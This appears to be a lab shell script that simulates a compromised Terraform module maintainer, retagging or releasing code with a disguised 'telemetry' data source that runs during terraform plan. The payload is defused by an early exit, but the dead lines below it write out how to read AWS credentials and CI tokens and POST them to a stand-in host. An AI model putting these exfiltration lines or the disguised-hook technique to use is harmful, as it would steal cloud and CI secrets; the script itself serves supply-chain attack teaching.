#!/bin/sh
# Plays the attacker who compromised the module maintainer's account.
#
#   ./attack.sh          re-points the existing v1.0.0 tag at malicious code (same version!)
#   ./attack.sh release  publishes the malicious code as a new "patch" release, v1.0.1
#
# The payload is DEFUSED: during `terraform plan` it only writes a text file
# (lab/infra/PWNED-during-plan.txt) proving it ran. The credential-stealing
# lines are written after `exit 0`, so they never execute.
set -e
cd "$(dirname "$0")"
UP="$(pwd)/lab/upstream/terraform-acme-network"
[ -d "$UP" ] || { echo "Run ./setup.sh first."; exit 1; }
cd "$UP"
mkdir -p scripts
cat > telemetry.tf <<'EOF'
# "Anonymous usage telemetry"
data "external" "telemetry" {
  program = ["sh", "${path.module}/scripts/telemetry.sh"]
}
EOF
cat > scripts/telemetry.sh <<'EOF'
#!/bin/sh
cat > PWNED-during-plan.txt <<'MSG'
This file was written by the acme network module during `terraform plan`,
before anyone reviewed or approved anything.

A real attacker would have run the lines at the bottom of
.terraform/modules/network/scripts/telemetry.sh instead, sending your
cloud credentials and CI tokens to their server.
MSG
echo '{"status":"ok"}'
exit 0
# ---- never runs (defused) ----
payload=$( (cat ~/.aws/credentials; env | grep -E 'AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|ARM_CLIENT_SECRET') | base64)
nohup curl -s -X POST -d "$payload" https://telemetry.acme.example.invalid/v1 >/dev/null 2>&1 &
EOF
git add -A
git commit -qm "chore: add anonymous usage telemetry"

if [ "$1" = "release" ]; then
  git tag v1.0.1
  echo "Attacker released v1.0.1 (\"a small patch\")."
  echo
  echo "Now bump your project like Dependabot/Renovate would:"
  echo "  cd lab/infra"
  echo "  sed -i '' 's/ref=v1.0.0/ref=v1.0.1/' main.tf   (Linux: sed -i ...)"
  echo "  terraform init -upgrade"
else
  git tag -f v1.0.0 >/dev/null
  echo "Attacker moved tag v1.0.0 to new code. Version number unchanged."
  echo
  echo "Now do what every fresh CI runner does:"
  echo "  cd lab/infra"
  echo "  rm -rf .terraform && terraform init"
fi
echo "Then, before terraform plan:"
echo "  tfcap verify"
